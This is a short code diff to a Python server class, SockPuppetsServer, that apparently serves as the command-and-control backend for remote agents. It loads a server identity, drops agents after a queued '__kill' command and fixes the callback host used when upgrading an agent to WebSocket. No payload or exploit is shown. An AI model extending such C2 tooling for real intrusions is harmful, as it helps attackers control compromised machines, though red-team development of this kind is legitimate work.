@@ -162,6 +162,8 @@ class SockPuppetsServer:
         self.profile = None
         self.events = EventBus()
         self.trusted_redirectors: list[str] = []
+        from crypto.handshake import ServerIdentity
+        self.identity = ServerIdentity.load()
 
     def _load_streaming_module(self) -> str:
         """Load and compress streaming module"""
@@ -787,6 +789,8 @@ class SockPuppetsServer:
                 except asyncio.QueueEmpty:
                     break
             response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
+            if agent.pending_kill and any(c.get('command') == '__kill' for c in commands):
+                del self.agents[agent_id]
         else:
             return web.Response(status=400)
         sealed = wire.seal(json.dumps(response, separators=(',', ':')))
@@ -1446,6 +1450,11 @@ class SockPuppetsServer:
 
         return "Upgrade failed"
 
+    def _callback_host(self, host: str) -> str:
+        if host in ("0.0.0.0", "::", ""):
+            return "127.0.0.1"
+        return host
+
     async def upgrade_to_websocket(self, agent_id: str, ws_host: str = None, ws_port: int = None) -> str:
         """Upgrade HTTP agent to WebSocket transport"""
         if agent_id not in self.agents:
@@ -1466,6 +1475,7 @@ class SockPuppetsServer:
 
         if ws_host is None or ws_port is None:
             return "No WebSocket listener running. Start one first with 'start [host] [port]'"
+        ws_host = self._callback_host(ws_host)
 
         # Queue upgrade command for the HTTP agent
         upgrade_cmd = json.dumps({
